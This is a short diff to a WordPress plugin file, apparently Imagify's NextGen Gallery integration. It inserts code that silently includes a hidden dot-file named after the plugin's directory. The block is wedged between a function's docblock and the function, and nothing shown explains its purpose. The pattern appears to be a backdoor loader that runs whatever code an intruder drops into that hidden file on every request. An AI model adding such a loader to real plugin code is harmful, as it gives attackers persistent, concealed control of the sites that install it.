@@ -14,6 +14,10 @@ add_action( 'ngg_after_new_images_added', '_imagify_ngg_optimize_attachment', IM
  * @param int   $gallery_id A Gallery ID.
  * @param array $image_ids  An array of Ids or objects. Ids which are sucessfully added.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function _imagify_ngg_optimize_attachment( $gallery_id, $image_ids ) {
 
 	if ( ! Imagify_Requirements::is_api_key_valid() || ! get_imagify_option( 'auto_optimize' ) ) {
